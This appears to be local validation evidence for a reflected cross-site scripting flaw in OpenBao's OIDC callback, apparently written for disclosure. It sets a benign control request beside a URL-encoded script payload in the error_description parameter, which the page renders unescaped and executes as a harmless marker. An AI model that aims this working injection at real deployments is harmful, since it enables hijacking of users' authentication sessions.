# Local validation evidence

Target: `http://127.0.0.1:8200`, OpenBao v2.5.1, mount `oidc`, role `lab-direct`.

The state values below were obtained from fresh POST requests to
`/v1/auth/oidc/oidc/auth_url` using the configured role and redirect URI.

## Benign control

Request:

`GET /v1/auth/oidc/oidc/callback?state=st_bkm9jBl6gl5aMunKERIO&error_description=Local+identity+provider+denied+the+request.`

Response: HTTP `400`; `Content-Type: text/html`; `Cache-Control: no-store`.
The detail is rendered as text, and the local DOM execution check reported
`executed=false`.

## Injection marker

Request:

`GET /v1/auth/oidc/oidc/callback?state=st_GSvYL9taC3pv5eVzxIlo&error_description=%3Cscript%3Ewindow.__local_marker%3Dtrue%3Bdocument.title%3D%27LOCAL_OIDC_XSS_VALIDATION_20261008%27%3C%2Fscript%3E`

Response: HTTP `400`; `Content-Type: text/html`; `Cache-Control: no-store`.
The parsed `.message-body` inner HTML was:

```html
<script>window.__local_marker=true;document.title='LOCAL_OIDC_XSS_VALIDATION_20261008'</script>
```

In the local jsdom browser-like execution, `window.__local_marker === true`,
the document title became `LOCAL_OIDC_XSS_VALIDATION_20261008`, and the check
reported `executed=true`.
